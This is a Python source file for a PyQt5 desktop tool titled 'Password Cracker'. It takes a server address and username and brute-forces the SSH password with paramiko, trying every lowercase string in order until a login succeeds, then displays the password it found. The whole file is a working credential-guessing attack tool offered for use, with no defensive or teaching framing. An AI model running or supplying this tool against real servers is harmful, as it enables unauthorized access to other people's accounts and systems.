from PyQt5 import QtCore
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QToolTip, QProgressBar, QLabel, QLineEdit
from PyQt5.QtGui import QFont
from PyQt5.QtCore import QBasicTimer

import sys
import paramiko
import os
import re
import time
import functions
import getpass

cli = paramiko.SSHClient()
cli.set_missing_host_key_policy(paramiko.AutoAddPolicy)

class MyApp(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.lblServer = QLabel(self)
        self.lblServer.setText("please type server")
        self.lblServer.setAlignment(QtCore.Qt.AlignLeft)
        self.lblServer.move(0, 3)
        self.lblUser = QLabel(self)
        self.lblUser.setText("please type username")
        self.lblUser.setAlignment(QtCore.Qt.AlignLeft)
        self.lblUser.move(0, 43)

        self.lbl = QLabel(self)
        self.lbl.move(0, 100)
        self.lbl.setText("대기중")
        self.lbl.repaint()

        self.inputServer = QLineEdit(self)
        self.inputServer.move(150, 0)
        self.inputServer.textChanged.connect(self.onChanged)
        self.inputUser = QLineEdit(self)
        self.inputUser.move(150, 40)
        self.inputUser.textChanged.connect(self.onChanged)

        self.buttonStart = QPushButton(self)
        self.buttonStart.setText('Start')
        self.buttonStart.clicked.connect(self.onStart)
        self.buttonStart.move(100, 200)

        self.buttonRestart = QPushButton(self)
        self.buttonRestart.setText('Restart')
        self.buttonRestart.clicked.connect(self.onRestart)
        self.buttonRestart.move(200, 200)

        self.setWindowTitle('Password Cracker')
        self.setGeometry(1000, 1000, 500, 400)
        self.show()

    def onChanged(self):
        self.lbl.setText("Taget --------\nServer: %s\nUser: %s" % (self.inputServer.text(), self.inputUser.text()))
        self.lbl.adjustSize()
    def onRestart(self):
        os.execl(sys.executable, '"{}"'.format(sys.executable), *sys.argv)


    def onStart(self):
        server = self.inputServer.text()
        user = self.inputUser.text()
        self.inputServer.setDisabled(True)
        self.inputUser.setDisabled(True)
        charList = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        result = "a"
        start_time = time.time()
        pwMatched = True
        while pwMatched:
            ok = True
            QApplication.processEvents()
            try:
                cli.connect(server, port=22, username=user, password=result)
            except paramiko.ssh_exception.AuthenticationException as e:
                ok = False
            cli.close()
            if ok == True:
                pwMatched = False
                break
            increased = functions.str_increaser(result, charList, 1)
            if increased != "str_increaser(): Input already max in charset":
                result = increased
            else:
                result = "a"+"a"*result.__len__()
            self.lbl.setText(result)
            self.lbl.adjustSize()
            self.lbl.repaint()
        self.lbl.setText("finished!"+" - "+result+"\n"+"--- "+str(round(time.time() - start_time, 2))+" seconds --- ")
        self.lbl.adjustSize()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = MyApp()
    sys.exit(app.exec_())